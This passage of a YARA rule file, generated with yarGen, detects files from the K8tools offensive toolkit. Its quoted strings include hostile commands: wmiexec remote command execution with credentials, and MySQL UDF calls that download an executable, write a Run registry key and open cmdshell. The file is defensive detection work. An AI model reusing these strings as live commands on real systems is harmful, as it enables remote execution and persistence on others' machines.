      $s17 = "org/eclipse/jdt/internal/jarinjarloader/JarRsrcLoader$ManifestInfo.class" fullword ascii /* score: '9.00'*/
      $s18 = "swing-layout-1.0.3.jar" fullword ascii /* score: '7.00'*/
      $s19 = "META-INF/BCKEY.SF" fullword ascii /* score: '7.00'*/
      $s20 = "o^mQ:\"@" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 5000KB and
      8 of them
}

rule K8____________________________________V2_0 {
   meta:
      description = "K8tools - file K8免杀系统自带捆绑器加强版V2.0.EXE"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "327776eafc0036c109802669dddb0578f4f0c3d7bb759a94a8e0cb1775572413"
   strings:
      $s1 = "NEL32.dll" fullword ascii /* score: '20.00'*/
      $s2 = "QQ396890445.EXE            " fullword wide /* score: '6.00'*/
      $s3 = "lOG)[4" fullword ascii /* score: '6.00'*/
      $s4 = "1Z{*|- " fullword ascii /* score: '5.42'*/
      $s5 = "}r?aOG:g- " fullword ascii /* score: '5.42'*/
      $s6 = "srSXmK6" fullword ascii /* score: '5.00'*/
      $s7 = "&m* f#" fullword ascii /* score: '5.00'*/
      $s8 = "LOADER ERROR" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5.00'*/ /* Goodware String - occured 4 times */
      $s9 = "RUNPROGRAM" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.99'*/ /* Goodware String - occured 9 times */
      $s10 = "CABINET" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.96'*/ /* Goodware String - occured 39 times */
      $s11 = "REBOOT" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.95'*/ /* Goodware String - occured 49 times */
      $s12 = "XwIA*WX^" fullword ascii /* score: '4.00'*/
      $s13 = "DVqW(-bo" fullword ascii /* score: '4.00'*/
      $s14 = "rEmdZ`$7" fullword ascii /* score: '4.00'*/
      $s15 = "yabO#[LH" fullword ascii /* score: '4.00'*/
      $s16 = ",?ArVd`>9" fullword ascii /* score: '4.00'*/
      $s17 = "FldxJ1Z" fullword ascii /* score: '4.00'*/
      $s18 = "g(Afcg]w{" fullword ascii /* score: '4.00'*/
      $s19 = "nBFw6w," fullword ascii /* score: '4.00'*/
      $s20 = "Z|\\%d/" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      ( pe.imphash() == "dbf06b6431ea05937bab0bd0b6ec1a82" or 8 of them )
}

rule applypatch_msg {
   meta:
      description = "K8tools - file applypatch-msg.sample"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "0223497a0b8b033aa58a3a521b8629869386cf7ab0e2f101963d328aa62193f7"
   strings:
      $s1 = "test -x \"$commitmsg\" && exec \"$commitmsg\" ${1+\"$@\"}" fullword ascii /* score: '26.00'*/
      $s2 = "# An example hook script to check the commit log message taken by" fullword ascii /* score: '22.00'*/
      $s3 = "commitmsg=\"$(git rev-parse --git-path hooks/commit-msg)\"" fullword ascii /* score: '11.00'*/
      $s4 = "# allowed to edit the commit message file." fullword ascii /* score: '11.00'*/
      $s5 = "# appropriate message if it wants to stop the commit.  The hook is" fullword ascii /* score: '11.00'*/
      $s6 = "# applypatch from an e-mail message." fullword ascii /* score: '8.00'*/
      $s7 = "# The hook should exit with non-zero status after issuing an" fullword ascii /* score: '8.00'*/
      $s8 = "# To enable this hook, rename this file to \"applypatch-msg\"." fullword ascii /* score: '8.00'*/
      $s9 = ". git-sh-setup" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule Ladon6_0 {
   meta:
      description = "K8tools - file Ladon6.0.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "079a63b9253cc27d752657ed947bd9e9cd0d8ddddeada002e7fdc34575ae8341"
   strings:
      $s1 = "Ladon.exe" fullword ascii /* score: '22.00'*/
      $s2 = "LadonGUI.exe" fullword ascii /* score: '22.00'*/
      $s3 = "Ladon40.exe" fullword ascii /* score: '22.00'*/
      $s4 = "Change.log" fullword ascii /* score: '19.00'*/
      $s5 = "Ladon.cna" fullword ascii /* score: '10.00'*/
      $s6 = "* V'ZW" fullword ascii /* score: '9.00'*/
      $s7 = "Ladon.ps1" fullword ascii /* score: '8.00'*/
      $s8 = ";7Y:\"?" fullword ascii /* score: '7.00'*/
      $s9 = "TNBm.ybLu" fullword ascii /* score: '7.00'*/
      $s10 = "{REyEG" fullword ascii /* score: '6.00'*/
      $s11 = "5cS}* " fullword ascii /* score: '5.42'*/
      $s12 = "1<$<+ " fullword ascii /* score: '5.42'*/
      $s13 = "# R0z-`6" fullword ascii /* score: '5.00'*/
      $s14 = "QEo- #" fullword ascii /* score: '5.00'*/
      $s15 = "-/%PF%" fullword ascii /* score: '5.00'*/
      $s16 = "ppaudf" fullword ascii /* score: '5.00'*/
      $s17 = "^^GB /h" fullword ascii /* score: '5.00'*/
      $s18 = "uTIgvJz3" fullword ascii /* score: '5.00'*/
      $s19 = "xUcEtj5" fullword ascii /* score: '5.00'*/
      $s20 = "gsofxl5" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 6000KB and
      8 of them
}

rule s_________ {
   meta:
      description = "K8tools - file s加强版.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "c0d1e9d5b766466392588248c36c9020a68a8f79343601e7a9aa2d08a7951367"
   strings:
      $s1 = "\\Usange44" fullword ascii /* score: '5.00'*/
      $s2 = "8OpenOUL;C " fullword ascii /* score: '4.42'*/
      $s3 = "GQuaryP" fullword ascii /* score: '4.00'*/
      $s4 = "SYNq12.Y" fullword ascii /* score: '4.00'*/
      $s5 = "PTyQp1<" fullword ascii /* score: '4.00'*/
      $s6 = "KERN0L32.8dl" fullword ascii /* score: '4.00'*/
      $s7 = "WriteCo9ns" fullword ascii /* score: '4.00'*/
      $s8 = "VPQOTG" fullword ascii /* score: '3.50'*/
      $s9 = "(@NQ)Z " fullword ascii /* score: '1.42'*/
      $s10 = "w<$b b" fullword ascii /* score: '1.00'*/
      $s11 = "9jL19I" fullword ascii /* score: '1.00'*/
      $s12 = "Jki,d$280QhP" fullword ascii /* score: '1.00'*/
      $s13 = "jp*.7#" fullword ascii /* score: '1.00'*/
      $s14 = "d7i-pJ7" fullword ascii /* score: '1.00'*/
      $s15 = "I~MEH\\\"" fullword ascii /* score: '1.00'*/
      $s16 = "Max;Hn." fullword ascii /* score: '1.00'*/
      $s17 = "qv@[id" fullword ascii /* score: '1.00'*/
      $s18 = "S!,44_" fullword ascii /* score: '1.00'*/
      $s19 = "|0T)CP" fullword ascii /* score: '1.00'*/
      $s20 = "-}-\\fl" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      ( pe.imphash() == "87bed5a7cba00c7e1f4015f1bdae2183" or 8 of them )
}

rule ScRunBase32 {
   meta:
      description = "K8tools - file ScRunBase32.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "6973d802aef27a76a07067858ff47999e67ef02879786608bedc4f1b0508ac30"
   strings:
      $s1 = "Failed to get address for PyImport_ExecCodeModule" fullword ascii /* score: '27.00'*/
      $s2 = "Failed to get address for Py_NoUserSiteDirectory" fullword ascii /* score: '23.00'*/
      $s3 = "Failed to get executable path." fullword ascii /* score: '20.00'*/
      $s4 = "Failed to get address for PyMarshal_ReadObjectFromString" fullword ascii /* score: '18.00'*/
      $s5 = "Failed to get address for PyRun_SimpleString" fullword ascii /* score: '18.00'*/
      $s6 = "Failed to get address for Py_FileSystemDefaultEncoding" fullword ascii /* score: '18.00'*/
      $s7 = "Failed to get address for PyUnicode_Decode" fullword ascii /* score: '17.00'*/
      $s8 = "Failed to get address for PyUnicode_DecodeFSDefault" fullword ascii /* score: '17.00'*/
      $s9 = "bScRunBase32.exe.manifest" fullword ascii /* score: '17.00'*/
      $s10 = "Error loading Python DLL '%s'." fullword ascii /* score: '15.00'*/
      $s11 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '15.00'*/
      $s12 = "Failed to get address for PySys_SetObject" fullword ascii /* score: '15.00'*/
      $s13 = "Failed to get address for Py_DontWriteBytecodeFlag" fullword ascii /* score: '15.00'*/
      $s14 = "Failed to get address for PyLong_AsLong" fullword ascii /* score: '15.00'*/
      $s15 = "Failed to get address for PyEval_EvalCode" fullword ascii /* score: '15.00'*/
      $s16 = "Failed to get address for Py_FrozenFlag" fullword ascii /* score: '15.00'*/
      $s17 = "Failed to get address for Py_SetPath" fullword ascii /* score: '15.00'*/
      $s18 = "Failed to get address for PyDict_GetItemString" fullword ascii /* score: '15.00'*/
      $s19 = "Failed to get address for PySys_AddWarnOption" fullword ascii /* score: '15.00'*/
      $s20 = "Failed to get address for PyImport_ImportModule" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      ( pe.imphash() == "4df47bd79d7fe79953651a03293f0e8f" or 8 of them )
}

rule Delphi_5KB____________________________0105_K8_ {
   meta:
      description = "K8tools - file Delphi 5KB无输入表下载者源码_0105[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "b98da0cd8e9f8f9be796fd249378c506e4087c9844c6f6ad433ab78bf6722c7b"
   strings:
      $s1 = "\\Fun.exe" fullword ascii /* score: '13.00'*/
      $s2 = "\\_Build.bat" fullword ascii /* score: '12.00'*/
      $s3 = "\\System.dcu" fullword ascii /* score: '11.00'*/
      $s4 = "\\System.pas" fullword ascii /* score: '11.00'*/
      $s5 = "\\Fun.cfg" fullword ascii /* score: '9.00'*/
      $s6 = "\\SysInit.pas" fullword ascii /* score: '8.00'*/
      $s7 = "\\SysInit.dcu" fullword ascii /* score: '8.00'*/
      $s8 = "\\Fun.dpr" fullword ascii /* score: '5.00'*/
      $s9 = "\\Fun.dof" fullword ascii /* score: '5.00'*/
      $s10 = "Delphi " fullword ascii /* score: '4.42'*/
      $s11 = "%D/[yXder=u" fullword ascii /* score: '4.00'*/
      $s12 = "\\0qq'',#.v," fullword ascii /* score: '2.42'*/
      $s13 = "\\Fun.~dpr" fullword ascii /* score: '2.00'*/
      $s14 = "wRAEv2" fullword ascii /* score: '2.00'*/
      $s15 = "'H\"+H 0" fullword ascii /* score: '1.00'*/
      $s16 = "w@~,=$" fullword ascii /* score: '1.00'*/
      $s17 = "^bb(v}" fullword ascii /* score: '1.00'*/
      $s18 = "]@P!KbzY" fullword ascii /* score: '1.00'*/
      $s19 = "CY+W%y" fullword ascii /* score: '1.00'*/
      $s20 = "Np%;8Fl5" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 50KB and
      8 of them
}

rule K8tools_scrun {
   meta:
      description = "K8tools - file scrun.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "406fa2253f7568e45639a0e0391949d66637f412b91c0dab6eaad5b97d30c0b2"
   strings:
      $s1 = "Failed to get address for PyImport_ExecCodeModule" fullword ascii /* score: '27.00'*/
      $s2 = "Failed to get address for Py_NoUserSiteDirectory" fullword ascii /* score: '23.00'*/
      $s3 = "Failed to get executable path." fullword ascii /* score: '20.00'*/
      $s4 = "Failed to get address for PyMarshal_ReadObjectFromString" fullword ascii /* score: '18.00'*/
      $s5 = "Failed to get address for PyRun_SimpleString" fullword ascii /* score: '18.00'*/
      $s6 = "Failed to get address for Py_FileSystemDefaultEncoding" fullword ascii /* score: '18.00'*/
      $s7 = "Failed to get address for PyUnicode_Decode" fullword ascii /* score: '17.00'*/
      $s8 = "Failed to get address for PyUnicode_DecodeFSDefault" fullword ascii /* score: '17.00'*/
      $s9 = "bscrun.exe.manifest" fullword ascii /* score: '17.00'*/
      $s10 = "Error loading Python DLL '%s'." fullword ascii /* score: '15.00'*/
      $s11 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '15.00'*/
      $s12 = "Failed to get address for PySys_SetObject" fullword ascii /* score: '15.00'*/
      $s13 = "Failed to get address for Py_DontWriteBytecodeFlag" fullword ascii /* score: '15.00'*/
      $s14 = "Failed to get address for PyLong_AsLong" fullword ascii /* score: '15.00'*/
      $s15 = "Failed to get address for PyEval_EvalCode" fullword ascii /* score: '15.00'*/
      $s16 = "Failed to get address for Py_FrozenFlag" fullword ascii /* score: '15.00'*/
      $s17 = "Failed to get address for Py_SetPath" fullword ascii /* score: '15.00'*/
      $s18 = "Failed to get address for PyDict_GetItemString" fullword ascii /* score: '15.00'*/
      $s19 = "Failed to get address for PySys_AddWarnOption" fullword ascii /* score: '15.00'*/
      $s20 = "Failed to get address for PyImport_ImportModule" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      ( pe.imphash() == "4df47bd79d7fe79953651a03293f0e8f" or 8 of them )
}

rule K8____________VBS_________________________________________ {
   meta:
      description = "K8tools - file K8随机加密VBS提权脚本(米特尼克公开的漏洞).rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "648858867d11eb91e233ff7b28c208fa47fa9e305fb648bd99fbc9475042dbbd"
   strings:
      $s1 = "[K.8].exe" fullword ascii /* score: '16.00'*/
      $s2 = ".net 2.0 " fullword ascii /* score: '4.42'*/
      $s3 = "yJWL\\N" fullword ascii /* score: '4.00'*/
      $s4 = "by K8" fullword ascii /* score: '1.00'*/
      $s5 = "e6(Y_5E" fullword ascii /* score: '1.00'*/
      $s6 = "[K.8]\\VBS" fullword ascii /* score: '1.00'*/
      $s7 = ";h+J}EO,=vG;" fullword ascii /* score: '1.00'*/
      $s8 = "WU+g@y" fullword ascii /* score: '1.00'*/
      $s9 = "5##R>kU" fullword ascii /* score: '1.00'*/
      $s10 = "3/w5Qv" fullword ascii /* score: '1.00'*/
      $s11 = "RLR\\edRt" fullword ascii /* score: '1.00'*/
      $s12 = "'ptj'P<" fullword ascii /* score: '1.00'*/
      $s13 = "hWCTl*" fullword ascii /* score: '1.00'*/
      $s14 = "Nqt3xs" fullword ascii /* score: '1.00'*/
      $s15 = "llz;a-_yV" fullword ascii /* score: '1.00'*/
      $s16 = "q_x*r]" fullword ascii /* score: '1.00'*/
      $s17 = ".Z_q/5/" fullword ascii /* score: '1.00'*/
      $s18 = "A<e,`1" fullword ascii /* score: '1.00'*/
      $s19 = "ZZ?Y~Bf" fullword ascii /* score: '1.00'*/
      $s20 = "Lia#B/" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 30KB and
      8 of them
}

rule K8fuckVNC {
   meta:
      description = "K8tools - file K8fuckVNC.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "fd5b442d12098cc3acf8e44030538310fd292c9c252ed43f64596dd4e4d222a1"
   strings:
      $s1 = "K8fuckVNC\\K8fuckVNC4.exe" fullword ascii /* score: '15.42'*/
      $s2 = "K8fuckVNC\\k8cmd.bat" fullword ascii /* score: '14.42'*/
      $s3 = "K8fuckVNC\\K8fuckVNC.PNG" fullword ascii /* score: '7.42'*/
      $s4 = "K8fuckVNC\\vnc4.1.3.reg" fullword ascii /* score: '7.00'*/
      $s5 = "K8fuckVNC\\vnc_5.0.5_K8team.reg" fullword ascii /* score: '7.00'*/
      $s6 = "]@* -" fullword ascii /* score: '5.00'*/
      $s7 = "@K8fuckVNC4 \"16,b0,5a,07,f6,ab,0f,c3\"  " fullword ascii /* score: '4.17'*/
      $s8 = "<yqLq)RX" fullword ascii /* score: '4.00'*/
      $s9 = "sadE\"," fullword ascii /* score: '4.00'*/
      $s10 = "K8fuckVNC\\" fullword ascii /* score: '4.00'*/
      $s11 = "K8fuckVNC" fullword ascii /* score: '4.00'*/
      $s12 = "\\euyRX" fullword ascii /* score: '2.00'*/
      $s13 = "' `<y;" fullword ascii /* score: '1.00'*/
      $s14 = "4 \"5\"s]" fullword ascii /* score: '1.00'*/
      $s15 = "H <EhA" fullword ascii /* score: '1.00'*/
      $s16 = "06/P>#=N!Wb" fullword ascii /* score: '1.00'*/
      $s17 = "RUlV7{" fullword ascii /* score: '1.00'*/
      $s18 = "H.L@,/'<" fullword ascii /* score: '1.00'*/
      $s19 = "+f3:V," fullword ascii /* score: '1.00'*/
      $s20 = "GZ^bqa" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 200KB and
      8 of them
}

rule K8______Final {
   meta:
      description = "K8tools - file K8飞刀Final.png"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "ddfecc997a10a047ba2ca7b29b8665117edbc5946e0ff00c381dcb97d3a46451"
   strings:
      $s1 = "tAAA!!!" fullword ascii /* score: '13.00'*/
      $s2 = "#--->>><\"\\" fullword ascii /* score: '6.00'*/
      $s3 = "Tbaaaai" fullword ascii /* score: '6.00'*/
      $s4 = "Zfbbbbj" fullword ascii /* score: '6.00'*/
      $s5 = "ljjjll4" fullword ascii /* score: '5.00'*/
      $s6 = "daaaai" fullword ascii /* score: '5.00'*/
      $s7 = "qKwf!L)}b" fullword ascii /* score: '4.00'*/
      $s8 = "tnee%~c" fullword ascii /* score: '4.00'*/
      $s9 = "NFoS[yw" fullword ascii /* score: '4.00'*/
      $s10 = "bCCC]]]}}" fullword ascii /* score: '4.00'*/
      $s11 = "cGOTTVT" fullword ascii /* score: '4.00'*/
      $s12 = "daXt3'''44" fullword ascii /* score: '4.00'*/
      $s13 = ">Xzrzs+I" fullword ascii /* score: '4.00'*/
      $s14 = "iVGv=3L" fullword ascii /* score: '4.00'*/
      $s15 = "eckK9Ei" fullword ascii /* score: '4.00'*/
      $s16 = "9sMHtsa6h=$W" fullword ascii /* score: '4.00'*/
      $s17 = "BczNXg6h" fullword ascii /* score: '4.00'*/
      $s18 = "~sweO!oGym" fullword ascii /* score: '4.00'*/
      $s19 = "VeeFFFfr:>" fullword ascii /* score: '4.00'*/
      $s20 = "Kz|BfRbFRRzrrZrr" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5089 and filesize < 500KB and
      8 of them
}

rule K8Access_________________________20190301_K8_ {
   meta:
      description = "K8tools - file K8Access数据库密码读取器_20190301[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "6607861a5b230dfb8e0a80fbb2383fedd0f4446c76a3407ab12dcf4478a07cfa"
   strings:
      $s1 = "\\K8skin.DLL" fullword ascii /* score: '21.00'*/
      $s2 = "[K.8].exe" fullword ascii /* score: '16.00'*/
      $s3 = "\\qqkiss.skin" fullword ascii /* score: '5.00'*/
      $s4 = "LPkAn x" fullword ascii /* score: '4.00'*/
      $s5 = "2%i~#{" fullword ascii /* score: '4.00'*/
      $s6 = "LFJLp$9" fullword ascii /* score: '4.00'*/
      $s7 = "Nrni.r;" fullword ascii /* score: '4.00'*/
      $s8 = "LAyX</%" fullword ascii /* score: '4.00'*/
      $s9 = "XikU52q" fullword ascii /* score: '4.00'*/
      $s10 = "eFusIwOu" fullword ascii /* score: '4.00'*/
      $s11 = "C.deY}" fullword ascii /* score: '4.00'*/
      $s12 = "LyxzsQ[" fullword ascii /* score: '4.00'*/
      $s13 = "WPFD@)[(#3" fullword ascii /* score: '4.00'*/
      $s14 = "ryqp. XF" fullword ascii /* score: '4.00'*/
      $s15 = "CKvxm)\">" fullword ascii /* score: '4.00'*/
      $s16 = "Xwuhth" fullword ascii /* score: '3.00'*/
      $s17 = "\\08uT#" fullword ascii /* score: '2.00'*/
      $s18 = "XtSqg0" fullword ascii /* score: '2.00'*/
      $s19 = "zT)j\\*z2rDv" fullword ascii /* score: '1.42'*/
      $s20 = "l5#s2\\z*2-" fullword ascii /* score: '1.42'*/
   condition:
      uint16(0) == 0x6152 and filesize < 400KB and
      8 of them
}

rule MS15_010_______K8team__20150603 {
   meta:
      description = "K8tools - file MS15-010提权[K8team]_20150603.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "3960b45c0fa159baa7a418ec42089acd7a38941a60dd7f1bb599f363f185efc1"
   strings:
      $s1 = "[K8team]\\cmd\\MS15010_EXP_x64.exe" fullword ascii /* score: '20.17'*/
      $s2 = "[K8team]\\cmd\\MS15010_EXP_x86.exe" fullword ascii /* score: '20.17'*/
      $s3 = "[K8team]\\MS15010_EXP_86.exe" fullword ascii /* score: '15.42'*/
      $s4 = "[K8team]\\MS15010_EXP_x64.exe" fullword ascii /* score: '15.42'*/
      $s5 = "[K8team]\\cmd" fullword ascii /* score: '9.42'*/
      $s6 = "[K8team]\\2008.PNG" fullword ascii /* score: '7.42'*/
      $s7 = "[K8team]\\win7.PNG" fullword ascii /* score: '7.00'*/
      $s8 = "[K8team]\\xp.PNG" fullword ascii /* score: '7.00'*/
      $s9 = "OVSRAFO" fullword ascii /* score: '6.50'*/
      $s10 = "eO- =C" fullword ascii /* score: '5.00'*/
      $s11 = "\\,.Kxo" fullword ascii /* score: '5.00'*/
      $s12 = "Y%d%R!\\" fullword ascii /* score: '5.00'*/
      $s13 = "MS15-010" fullword ascii /* score: '5.00'*/
      $s14 = "7hQFZ`d k" fullword ascii /* score: '4.00'*/
      $s15 = "lxwyP>\\" fullword ascii /* score: '4.00'*/
      $s16 = "}QinaF8T" fullword ascii /* score: '4.00'*/
      $s17 = "JqdTS#o" fullword ascii /* score: '4.00'*/
      $s18 = "z.rTl.Q3" fullword ascii /* score: '4.00'*/
      $s19 = "rXCX?}" fullword ascii /* score: '4.00'*/
      $s20 = "luCt!T" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule K8tools_wmiexec {
   meta:
      description = "K8tools - file wmiexec.vbs"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "72d8861156228328e25366320a7eed46c68cd4a570dbb407c858072956f3dcc7"
   strings:
      $x1 = "strNetUse = \"cmd.exe /c net use \\\\\" & host & \" \"\"\" & pass & \"\"\" \" & \"/user:\" & user" fullword ascii /* score: '50.00'*/
      $x2 = "strExec = \"cmd.exe /c \" & cmd & \" > \" & file & \" 2>&1\"  '2>&1 err" fullword ascii /* score: '45.00'*/
      $x3 = "strNetUse = \"cmd.exe /c net use \\\\\" & host & \" /del\"" fullword ascii /* score: '41.00'*/
      $x4 = "vbNewLine & vbTab & \"wmiexec.vbs  /cmd  host  user  pass  command\" & vbNewLine & _" fullword ascii /* score: '41.00'*/
      $x5 = "vbNewLine & vbTab & \"wmiexec.vbs  /cmd  host  command\" & _" fullword ascii /* score: '38.00'*/
      $x6 = "vbNewLine & vbTab & \"wmiexec.vbs  /shell  host  user  pass\" & _" fullword ascii /* score: '33.00'*/
      $x7 = "WScript.Echo \"WMIEXEC : Target -> \" & host" fullword ascii /* score: '32.00'*/
      $x8 = "vbNewLine & \"WMIEXEC ERROR: Command -> \" & cmd & _" fullword ascii /* score: '31.00'*/
      $x9 = "vbTab & \"wmiexec.vbs  /shell  host\" & _" fullword ascii /* score: '30.00'*/
      $x10 = "WScript.Echo \"WMIEXEC : Login -> OK\"" fullword ascii /* score: '30.00'*/
      $s11 = "vbNewLine & vbTab & \"  command\" & vbTab & \"the command to execute on remote host\" & _" fullword ascii /* score: '30.00'*/
      $s12 = "Set Matches = regEx.Execute(cmd)" fullword ascii /* score: '29.01'*/
      $s13 = "WScript.Echo \"WMIEXEC ERROR: Process could not be created.\" & _" fullword ascii /* score: '29.00'*/
      $s14 = "'process 'cd' command-------->>>>" fullword ascii /* score: '28.00'*/
      $s15 = "(strExec, CurrentFolder, objConfig, intProcessID)  'Add CurrentFolder (strExec, Null, objConfig, intProcessID)" fullword ascii /* score: '27.42'*/
      $s16 = "WScript.Echo vbNewLine & vbTab & host & \"  >>  \" & command" fullword ascii /* score: '26.00'*/
      $s17 = "If boolShellMode = False Then command = objArgs.Item(intArgCount - 1)" fullword ascii /* score: '25.00'*/
      $s18 = "DestFolder = Exec(command, file)" fullword ascii /* score: '24.17'*/
      $s19 = "WScript.Echo \" Usage:\" & _" fullword ascii /* score: '24.00'*/
      $s20 = "WScript.Echo \"WMIEXEC ERROR: Insufficient Privilege!\"" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6e4f and filesize < 30KB and
      1 of ($x*) and all of them
}

rule K8tools_sshcmd_3 {
   meta:
      description = "K8tools - file sshcmd.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "5b76fa00cd26d3151e7f22e49ff147242c20ec9aaebf8aa77251a6832a361ca9"
   strings:
      $s1 = "sshcmd.exeM" fullword ascii /* score: '23.00'*/
      $s2 = "DOHR.saR" fullword ascii /* score: '10.00'*/
      $s3 = "rem.txtM" fullword ascii /* score: '8.00'*/
      $s4 = "sshcmdM" fullword ascii /* score: '7.00'*/
      $s5 = "bR2q:\\" fullword ascii /* score: '7.00'*/
      $s6 = "dJ2%i,A" fullword ascii /* score: '6.50'*/
      $s7 = "n)NfTPC" fullword ascii /* score: '6.00'*/
      $s8 = "- O[Q;" fullword ascii /* score: '5.00'*/
      $s9 = "\"+ bk ex" fullword ascii /* score: '5.00'*/
      $s10 = ">K* !2D" fullword ascii /* score: '5.00'*/
      $s11 = "cLsZmP2" fullword ascii /* score: '5.00'*/
      $s12 = "Cve?2t" fullword ascii /* score: '5.00'*/
      $s13 = "U:+ +i" fullword ascii /* score: '5.00'*/
      $s14 = "HdPNOd8" fullword ascii /* score: '5.00'*/
      $s15 = "c6X2\"BsQshMFC" fullword ascii /* score: '4.42'*/
      $s16 = "aWDu\\ " fullword ascii /* score: '4.42'*/
      $s17 = "(]EjUyR? " fullword ascii /* score: '4.42'*/
      $s18 = "DvwGvWI " fullword ascii /* score: '4.42'*/
      $s19 = "Xlzd=)[ >OK" fullword ascii /* score: '4.42'*/
      $s20 = "RoZdOf pI=r!" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 5000KB and
      8 of them
}

rule K8tools_udf {
   meta:
      description = "K8tools - file udf.dll"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1dce77bcddf265fb61abaa92ccf30a93fc9831c82eafd3dec13bbe1f635f2666"
   strings:
      $x1 = ":select downloader(\"http://www.baidu.com/server.exe\",\"c:\\\\winnt\\\\system32\\\\ser.exe\");" fullword ascii /* score: '46.00'*/
      $x2 = ":select regwrite(\"HKEY_LOCAL_MACHINE\",\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",\"adduser\",\"REG_SZ\",\"c" ascii /* score: '44.01'*/
      $x3 = ":select regwrite(\"HKEY_LOCAL_MACHINE\",\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",\"adduser\",\"REG_SZ\",\"c" ascii /* score: '41.00'*/
      $x4 = "C:\\Users\\K8team\\Desktop\\MYSQL_UDF 5.0\\Release\\MYSQL_UDF 5.0.pdb" fullword ascii /* score: '33.00'*/
      $s5 = "downloader " fullword ascii /* score: '21.42'*/
      $s6 = "MYSQL_UDF 5.0.dll" fullword ascii /* score: '20.00'*/
      $s7 = "UDF.dll" fullword wide /* score: '20.00'*/
      $s8 = "MYSQL_UDF.dll" fullword wide /* score: '20.00'*/
      $s9 = "downloader_deinit" fullword ascii /* score: '19.00'*/
      $s10 = "downloader_init" fullword ascii /* score: '19.00'*/
      $s11 = ":select cmdshell(\"dir c:\\\\\");" fullword ascii /* score: '18.00'*/
      $s12 = "ProcessView " fullword ascii /* score: '15.42'*/
      $s13 = "HKEY_USERS " fullword ascii /* score: '15.42'*/
      $s14 = "KillProcess  " fullword ascii /* score: '15.17'*/
      $s15 = "ProcessView_deinit" fullword ascii /* score: '15.00'*/
      $s16 = "KillProcess_deinit" fullword ascii /* score: '15.00'*/
      $s17 = "ProcessView_init" fullword ascii /* score: '15.00'*/
      $s18 = ":select ProcessView();" fullword ascii /* score: '15.00'*/
      $s19 = "KillProcess_init" fullword ascii /* score: '15.00'*/
      $s20 = ":select KillProcess(\"" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      ( pe.imphash() == "7957e55d68fe0e405edc5e26cb84af18" and ( pe.exports("KillProcess") and pe.exports("KillProcess_deinit") and pe.exports("KillProcess_init") and pe.exports("ProcessView") and pe.exports("ProcessView_deinit") and pe.exports("ProcessView_init") ) or ( 1 of ($x*) or 4 of them ) )
}

rule K8____________4______ {
   meta:
      description = "K8tools - file K8侠盗猎车4外挂.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "21694f63f97700aee216772f10044bb78c2c0780a07aac17a2333d8bf3e6e6e0"
   strings:
      $s1 = "@user32.dll" fullword ascii /* score: '23.00'*/
      $s2 = "WinIo.dll" fullword wide /* score: '23.00'*/
      $s3 = "WINIO.dll" fullword ascii /* score: '23.00'*/
      $s4 = "explorer http://qhack8.qzone.qq.com/blog/1199308436" fullword ascii /* score: '22.00'*/
      $s5 = "WinIO.sys" fullword ascii /* score: '22.00'*/
      $s6 = "hknms.sys" fullword ascii /* score: '22.00'*/
